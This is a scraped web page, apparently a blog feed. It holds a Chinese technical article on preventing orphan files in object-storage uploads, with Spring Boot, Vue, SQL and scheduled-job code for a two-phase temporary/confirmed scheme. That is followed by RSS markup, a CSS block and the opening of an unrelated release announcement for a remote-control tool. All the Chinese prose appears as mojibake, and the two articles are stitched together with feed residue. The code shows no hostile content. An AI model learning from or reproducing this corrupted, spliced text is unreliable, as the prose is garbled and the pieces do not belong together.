<p>ä¹…è€Œä¹…ä¹‹ï¼Œè¿™äº›<code>å­¤å„¿æ–‡ä»¶ï¼ˆOrphan Filesï¼‰</code>ä¼šå ç”¨å¤§é‡å­˜å‚¨ç©ºé—´ï¼Œå¢åŠ æˆæœ¬ï¼Œç”šè‡³å¸¦æ¥åˆè§„é£é™©ã€‚</p>
<p>æœ¬æ–‡å°†æä¾›ä¸€å¥—ç”Ÿäº§çº§çš„è§£å†³æ–¹æ¡ˆï¼Œæ¶µç›–è½»é‡çº§åœºæ™¯ä¸é€šç”¨åœºæ™¯çš„æ²»ç†ç­–ç•¥ã€‚</p>
<h2 data-id="heading-1">2. æ–¹æ¡ˆå¯¹æ¯”ä¸é€‰å‹</h2>
<p>é’ˆå¯¹æ­¤é—®é¢˜ï¼Œä¸šç•Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§è§£æ³•ï¼Œéœ€æ ¹æ®ä¸šåŠ¡åœºæ™¯çµæ´»é€‰æ‹©ï¼š</p>








































<table><thead><tr><th align="left">æ–¹æ¡ˆ</th><th align="left">æ ¸å¿ƒé€»è¾‘</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left"><strong>æ–¹æ¡ˆ Aï¼šæ··åˆæäº¤ (FormData)</strong></td><td align="left"><strong>æ–‡ä»¶ä¸è¡¨å•åŒæ¥å£ä¸€æ¬¡æäº¤</strong></td><td align="left"><strong>åŸå­æ€§ï¼Œæ— å­¤å„¿æ–‡ä»¶</strong></td><td align="left">ä¸æ”¯æŒå¤§æ–‡ä»¶ï¼Œç”¨æˆ·ä½“éªŒå·®ï¼ˆéœ€ç­‰å¾…ä¸Šä¼ ï¼‰</td><td align="left"><strong>å°æ–‡ä»¶ã€å¤´åƒã€å‡­è¯</strong></td></tr><tr><td align="left"><strong>æ–¹æ¡ˆ Bï¼šä¸¤é˜¶æ®µæäº¤</strong></td><td align="left"><strong>ä¸Šä¼ å³ä¸´æ—¶ï¼Œä¸šåŠ¡æäº¤æ‰è½¬æ­£</strong></td><td align="left"><strong>é€»è¾‘ä¸¥å¯†ï¼Œå®Œå…¨å¯æ§ï¼Œä½“éªŒå¥½</strong></td><td align="left">å¼€å‘æˆæœ¬ç¨é«˜ï¼Œéœ€å¼•å…¥å®šæ—¶ä»»åŠ¡</td><td align="left"><strong>å¤§æ–‡ä»¶ã€é€šç”¨ä¸šåŠ¡</strong></td></tr><tr><td align="left"><strong>æ–¹æ¡ˆ Cï¼šå®šæœŸåæŸ¥</strong></td><td align="left">å®šæ—¶æ‰«ææ–‡ä»¶è¡¨ï¼ŒåæŸ¥ä¸šåŠ¡è¡¨</td><td align="left">é€»è¾‘ç›´è§‚</td><td align="left">è·¨è¡¨æŸ¥è¯¢æˆæœ¬é«˜ï¼Œæ‰©å±•æ€§å·®</td><td align="left">æ—§ç³»ç»Ÿæ”¹é€ </td></tr><tr><td align="left"><strong>æ–¹æ¡ˆ Dï¼šOSS ç”Ÿå‘½å‘¨æœŸ</strong></td><td align="left">åˆ©ç”¨ OSS è§„åˆ™è‡ªåŠ¨åˆ é™¤ <code>temp/</code></td><td align="left">é›¶ä»£ç </td><td align="left">æ— æ³•ç²¾ç¡®æ§åˆ¶ä¸šåŠ¡çŠ¶æ€</td><td align="left">å…œåº•è¾…åŠ©</td></tr></tbody></table>
<p><strong>é€‰å‹ç»“è®ºï¼š</strong></p>
<ul>
<li><strong>è½»é‡çº§åœºæ™¯</strong>ï¼ˆå¦‚å¤´åƒä¿®æ”¹ï¼‰ï¼šä¼˜å…ˆä½¿ç”¨ <strong>æ–¹æ¡ˆ Aï¼ˆæ··åˆæäº¤ï¼‰</strong>ï¼Œç®€å•ç²—æš´ã€‚</li>
<li><strong>é€šç”¨/å¤æ‚åœºæ™¯</strong>ï¼šæ¨èé‡‡ç”¨ <strong>æ–¹æ¡ˆ Bï¼ˆä¸¤é˜¶æ®µæäº¤ï¼‰</strong> ä½œä¸ºä¸»æ–¹æ¡ˆï¼Œé…åˆ <strong>æ–¹æ¡ˆ D</strong> ä½œä¸ºå…œåº•ã€‚</li>
</ul>
<h2 data-id="heading-2">3. è½»é‡çº§è§£æ³•ï¼šæ··åˆæäº¤ (FormData)</h2>
<p>å¯¹äºæ–‡ä»¶ä½“ç§¯å°ï¼ˆ&lt; 2MBï¼‰ã€æ•°é‡å°‘çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æ”¾å¼ƒå¼‚æ­¥ä¸Šä¼ ï¼Œç›´æ¥å°†æ–‡ä»¶æµä¸ JSON æ•°æ®æ‰“åŒ…åœ¨ä¸€èµ·æäº¤ã€‚</p>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿</strong>ï¼šåˆ©ç”¨ HTTP è¯·æ±‚çš„åŸå­æ€§ï¼Œè¦ä¹ˆå…¨æˆåŠŸï¼Œè¦ä¹ˆå…¨å¤±è´¥ï¼Œæ ¹æºä¸Šæ¶ˆç­å­¤å„¿æ–‡ä»¶ã€‚</p>
<p><strong>å‰ç«¯ä»£ç ç¤ºä¾‹ï¼ˆVue/Axiosï¼‰ï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">data, imageFile</span>) {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>()
  
  <span class="hljs-comment">// 1. å°†å¤æ‚çš„ JSON æ•°æ®è½¬ä¸º Blob æ”¾å…¥ data å­—æ®µ</span>
  <span class="hljs-comment">// æ³¨æ„è®¾ç½® Content-Type ä¸º application/jsonï¼Œæ–¹ä¾¿åç«¯è§£æ</span>
  formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'data'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data)], { <span class="hljs-attr">type</span>: <span class="hljs-string">'application/json'</span> }))
  
  <span class="hljs-keyword">if</span> (imageFile) {
    <span class="hljs-comment">// 2. (å¯é€‰) å‰ç«¯å‹ç¼©å›¾ç‰‡</span>
    <span class="hljs-keyword">const</span> webpFile = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertImageToWebp</span>(imageFile, <span class="hljs-number">0.8</span>)
    formData.<span class="hljs-title function_">append</span>(<span class="hljs-string">'imageFile'</span>, webpFile)
  }
  
  <span class="hljs-comment">// 3. ä¸€æ¬¡æ€§æäº¤</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">request</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'/reward'</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">'post'</span>, <span class="hljs-attr">data</span>: formData })
}
</code></pre>
<p><strong>åç«¯å¤„ç†ï¼ˆSpring Boot ç¤ºä¾‹ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping(value = "/reward", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)</span>
<span class="hljs-keyword">public</span> Result <span class="hljs-title function_">create</span><span class="hljs-params">(
    <span class="hljs-meta">@RequestPart("data")</span> RewardDTO rewardDTO, // è‡ªåŠ¨è§£æ JSON
    <span class="hljs-meta">@RequestPart(value = "imageFile", required = false)</span> MultipartFile imageFile
)</span> {
    <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘ä¸æ–‡ä»¶å¤„ç†åœ¨åŒä¸€çº¿ç¨‹/äº‹åŠ¡ä¸­</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> ossService.upload(imageFile);
    rewardService.save(rewardDTO, url);
    <span class="hljs-keyword">return</span> Result.ok();
}
</code></pre>
<h2 data-id="heading-3">4. é€šç”¨çº§è§£æ³•ï¼šä¸¤é˜¶æ®µæäº¤</h2>
<p>å¯¹äºå¤§æ–‡ä»¶æˆ–ä½“éªŒè¦æ±‚é«˜çš„åœºæ™¯ï¼Œå¿…é¡»ä½¿ç”¨å¼‚æ­¥ä¸Šä¼ ã€‚æ­¤æ—¶éœ€å¼•å…¥<strong>ç”Ÿå‘½å‘¨æœŸç®¡ç†</strong>ã€‚</p>
<h3 data-id="heading-4">4.1 æ ¸å¿ƒæ€æƒ³</h3>
<p>å°†æ–‡ä»¶çš„ç”Ÿå‘½å‘¨æœŸåˆ’åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li><strong>ä¸´æ—¶æ€ (TEMP)</strong>ï¼šæ–‡ä»¶åˆšä¸Šä¼ ï¼Œåªæœ‰â€œä¸´æ—¶å±…ä½è¯â€ï¼Œè®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆå¦‚ 24hï¼‰ã€‚</li>
<li><strong>å·²ç”¨æ€ (USED)</strong>ï¼šä¸šåŠ¡è¡¨å•æäº¤æˆåŠŸåï¼Œç¡®è®¤ä¸ºâ€œæ°¸ä¹…å±…æ°‘â€ã€‚</li>
</ol>
<h3 data-id="heading-5">4.2 æ•°æ®åº“è®¾è®¡</h3>
<p>æˆ‘ä»¬éœ€è¦ä¸€å¼ ç»Ÿä¸€çš„æ–‡ä»¶è®°å½•è¡¨ <code>sys_file</code>ï¼š</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `sys_file` (
  `id` <span class="hljs-type">bigint</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `url` <span class="hljs-type">varchar</span>(<span class="hljs-number">512</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'æ–‡ä»¶åœ°å€'</span>,
  `status` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-number">0</span> COMMENT <span class="hljs-string">'0:TEMP(ä¸´æ—¶), 1:USED(å·²ç”¨)'</span>,
  `expire_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'è¿‡æœŸæ—¶é—´'</span>,
  `create_time` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
  KEY `idx_status_expire` (`status`, `expire_time`) <span class="hljs-comment">-- æ–¹ä¾¿å®šæ—¶ä»»åŠ¡æ‰«æ</span>
);
</code></pre>
<h3 data-id="heading-6">4.3 ä¸šåŠ¡æµç¨‹å®ç°</h3>
<h4 data-id="heading-7">Step 1: æ–‡ä»¶ä¸Šä¼ ï¼ˆé»˜è®¤ä¸ºä¸´æ—¶ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> FileVO <span class="hljs-title function_">upload</span><span class="hljs-params">(MultipartFile file)</span> {
    <span class="hljs-comment">// 1. ä¸Šä¼ è‡³ OSS</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> ossClient.putObject(file);
    
    <span class="hljs-comment">// 2. è®°å½•åˆ°æœ¬åœ°è¡¨ï¼ŒçŠ¶æ€ä¸º TEMP</span>
    <span class="hljs-type">SysFile</span> <span class="hljs-variable">sysFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SysFile</span>();
    sysFile.setUrl(url);
    sysFile.setStatus(Status.TEMP);
    <span class="hljs-comment">// 3. å…³é”®ï¼šè®¾ç½®è¿‡æœŸæ—¶é—´ï¼ˆä¾‹å¦‚ 24 å°æ—¶åï¼‰</span>
    sysFile.setExpireTime(LocalDateTime.now().plusHours(<span class="hljs-number">24</span>));
    
    sysFileMapper.insert(sysFile);
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileVO</span>(sysFile.getId(), url);
}
</code></pre>
<h4 data-id="heading-8">Step 2: ä¸šåŠ¡æäº¤ï¼ˆç¡®è®¤è½¬æ­£ï¼‰</h4>
<p>è¿™æ˜¯ç¡®ä¿æ•°æ®ä¸€è‡´æ€§çš„å…³é”®æ­¥éª¤ï¼Œå¿…é¡»åœ¨<strong>äº‹åŠ¡</strong>ä¸­è¿›è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Transactional(rollbackFor = Exception.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createProduct</span><span class="hljs-params">(ProductForm form)</span> {
    <span class="hljs-comment">// 1. ä¿å­˜ä¸šåŠ¡æ•°æ®</span>
    productMapper.insert(form);
    
    <span class="hljs-comment">// 2. å°†å…³è”çš„æ–‡ä»¶ ID æ ‡è®°ä¸º USED</span>
    <span class="hljs-comment">// åªæœ‰ä¸šåŠ¡ä¿å­˜æˆåŠŸï¼Œæ–‡ä»¶æ‰ä¼šè¢«æ ‡è®°ï¼Œé¿å…äº†â€œä¸šåŠ¡å¤±è´¥æ–‡ä»¶ç¡®ä¿ç•™â€çš„æƒ…å†µ</span>
    <span class="hljs-keyword">if</span> (CollectionUtils.isNotEmpty(form.getFileIds())) {
        sysFileMapper.updateStatusBatch(form.getFileIds(), Status.USED);
    }
}
</code></pre>
<h4 data-id="heading-9">Step 3: å®šæ—¶æ¸…ç†ï¼ˆåƒåœ¾å›æ”¶ï¼‰</h4>
<p>å¯åŠ¨ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼ˆå¦‚ XXL-JOBï¼‰ï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@XxlJob("cleanTempFileJob")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cleanTempFileJob</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 1. æ‰«ææ‰€æœ‰çŠ¶æ€ä¸º TEMP ä¸”å·²è¿‡æœŸçš„æ–‡ä»¶</span>
    List&lt;SysFile&gt; expiredFiles = sysFileMapper.selectExpired(Status.TEMP, LocalDateTime.now());
    
    <span class="hljs-keyword">for</span> (SysFile file : expiredFiles) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 2. åˆ é™¤ OSS ä¸Šçš„ç‰©ç†æ–‡ä»¶</span>
            ossClient.deleteObject(file.getUrl());
            <span class="hljs-comment">// 3. åˆ é™¤ï¼ˆæˆ–å½’æ¡£ï¼‰æœ¬åœ°è®°å½•</span>
            sysFileMapper.deleteById(file.getId());
        } <span class="hljs-keyword">catch</span> (Exception e) {
            log.error(<span class="hljs-string">"æ–‡ä»¶æ¸…ç†å¤±è´¥: "</span> + file.getId(), e);
        }
    }
}
</code></pre>
<h3 data-id="heading-10">4.4 æ¶æ„äº¤äº’å›¾</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant User as ç”¨æˆ·
    participant App as åç«¯æœåŠ¡
    participant DB as æ•°æ®åº“
    participant OSS as å¯¹è±¡å­˜å‚¨
    participant Job as æ¸…ç†ä»»åŠ¡

    User-&gt;&gt;App: 1. ä¸Šä¼ æ–‡ä»¶
    App-&gt;&gt;OSS: ç‰©ç†å­˜å‚¨
    App-&gt;&gt;DB: è®°å½•æ–‡ä»¶ (Status=TEMP)
    App--&gt;&gt;User: è¿”å› fileId

    alt ç”¨æˆ·æäº¤è¡¨å•
        User-&gt;&gt;App: 2. æäº¤ä¸šåŠ¡æ•°æ®(å« fileId)
        App-&gt;&gt;DB: å¼€å¯äº‹åŠ¡
        App-&gt;&gt;DB: ä¿å­˜ä¸šåŠ¡æ•°æ®
        App-&gt;&gt;DB: æ›´æ–°æ–‡ä»¶ Status=USED
        App--&gt;&gt;User: æˆåŠŸ
    else ç”¨æˆ·æ”¾å¼ƒ
        Note right of User: æ— æ“ä½œ
    end

    loop å®šæ—¶æ¸…ç†
        Job-&gt;&gt;DB: æŸ¥è¯¢ (Status=TEMP &amp; Time &lt; Now)
        Job-&gt;&gt;OSS: åˆ é™¤ç‰©ç†æ–‡ä»¶
        Job-&gt;&gt;DB: åˆ é™¤æ•°æ®åº“è®°å½•
    end
</code></pre>
<h2 data-id="heading-11">5. é¿å‘ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-12">1ã€ä¸šåŠ¡ä¿å­˜å¤±è´¥å¯¼è‡´æ–‡ä»¶æ³„éœ²</h3>
<p><strong>ç°è±¡</strong>ï¼šä¸šåŠ¡ä»£ç æŠ›å¼‚å¸¸å›æ»šäº†ï¼Œä½†ç´§æ¥ç€çš„ä¸€è¡Œâ€œæ–‡ä»¶çŠ¶æ€æ›´æ–°â€æ²¡æœ‰åœ¨åŒä¸€ä¸ªäº‹åŠ¡é‡Œï¼Œæˆ–è€…æ‰‹åŠ¨ try-catch åæ‰äº†å¼‚å¸¸ã€‚</p>
<p><strong>å¯¹ç­–</strong>ï¼šåŠ¡å¿…ç¡®ä¿ <code>updateStatus</code> å’Œ <code>saveBusiness</code> åœ¨åŒä¸€ä¸ª <code>@Transactional</code> äº‹åŠ¡å†…ã€‚</p>
<h3 data-id="heading-13">2ã€ç›´æ¥ä½¿ç”¨ OSS URL ä½œä¸ºå‚æ•°</h3>
<p><strong>ç°è±¡</strong>ï¼šå‰ç«¯ç›´æ¥ä¼  URL ç»™åç«¯ï¼Œåç«¯è¿˜è¦å»åæŸ¥ IDã€‚</p>
<p><strong>å¯¹ç­–</strong>ï¼šä¸Šä¼ æ¥å£è¿”å› <code>fileId</code>ï¼Œå‰ç«¯æäº¤è¡¨å•æ—¶ä¼  <code>fileId</code>ã€‚<code>fileId</code> æ˜¯æˆ‘ä»¬ç³»ç»Ÿçš„å†…ç ï¼Œæ§åˆ¶æƒåœ¨è‡ªå·±æ‰‹é‡Œã€‚</p>
<hr/>
<p>ä½œä¸ºåŒé‡ä¿é™©ï¼Œå»ºè®®åœ¨ OSS/S3 æ§åˆ¶å°é…ç½® <strong>Lifecycle Rule</strong>ï¼š</p>
<p>æ¯”å¦‚<code>bucket/temp/*</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œ<code>7</code> å¤©åè‡ªåŠ¨åˆ é™¤ã€‚è¿™æ ·å³ä½¿å®šæ—¶ä»»åŠ¡æŒ‚äº†ï¼Œæˆ–è€…æ•°æ®åº“ç‚¸äº†ï¼ŒOSS ä¹Ÿä¼šå¸®æˆ‘ä»¬å®ˆä½åº•çº¿ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼]]></title>    <link>https://juejin.cn/post/7592559120118431790</link>    <guid>https://juejin.cn/post/7592559120118431790</guid>    <pubDate>2026-01-08T03:36:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592559120118431790" data-draft-id="7592683699771047946" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼"/> <meta itemprop="keywords" content="è¿œç¨‹å·¥ä½œ"/> <meta itemprop="datePublished" content="2026-01-08T03:36:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºçš„çŸ³å¤´_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºçš„çŸ³å¤´_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:36:05.000Z" title="Thu Jan 08 2026 03:36:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>èŠ‚ç‚¹å°å®4.0 æ­£å¼å‘å¸ƒï¼šä¸€é”®ç›´è¾¾ï¼Œé‡æ–°å®šä¹‰è¿œç¨‹æ§åˆ¶ï¼</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7c42579af4643bfa8f26c5fc4b9e6f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=KSeGwWL2%2FkIu0e4U3qziJ7dPOXI%3D" alt="" loading="lazy"/></p>
<p><strong>èŠ‚ç‚¹å°å®4.0 æ¥äº†ï¼è¿™ä¸æ˜¯ä¸€æ¬¡å¸¸è§„çš„è¿­ä»£ï¼Œè€Œæ˜¯ä¸€æ¬¡å½»åº•çš„å‡æ³•ã€‚</strong></p>
<p>æˆ‘ä»¬å°†å¤æ‚çš„è¿œç¨‹æ§åˆ¶é…ç½®ã€ç¹ççš„æ–‡ä»¶è®¿é—®è·¯å¾„ã€ä»¥åŠå¡é¡¿çš„è¿œç¨‹æ“æ§ä½“éªŒï¼Œå…¨éƒ¨æ¨ç¿»é‡æ„ã€‚</p>
<p>ç›®æ ‡åªæœ‰ä¸€ä¸ªï¼š</p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff574c1c45c04aa7a2ec7b2ee6cf0c25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=s0AB%2BCWO1gtg4bNWQ%2B0NECvEf8k%3D" alt="" loading="lazy"/></p>

<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30be54812d6f48c3b6964d41686503d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768448164&amp;x-signature=bTYJtk8UfVgEHhFfTXRRJYnsRNo%3D" alt="" loading="lazy"/></p>
<p>åœ¨3.0ç‰ˆæœ¬ä¸­ï¼Œå¾ˆå¤šç”¨æˆ·åé¦ˆæ·»åŠ è®¾å¤‡åƒæ˜¯åœ¨å½“ç½‘ç®¡ï¼ŒæŸ¥IPã€å¡«ç«¯å£ã€é…è½¬å‘ï¼Œæµç¨‹ç¹çã€‚<strong>è€Œæˆ‘ä»¬çš„4.0ç‰ˆæœ¬é’ˆå¯¹è¿™äº›ç—›ç‚¹ï¼Œè¿›è¡Œäº†åº•å±‚é€»è¾‘çš„é‡æ„ã€‚</strong></p>

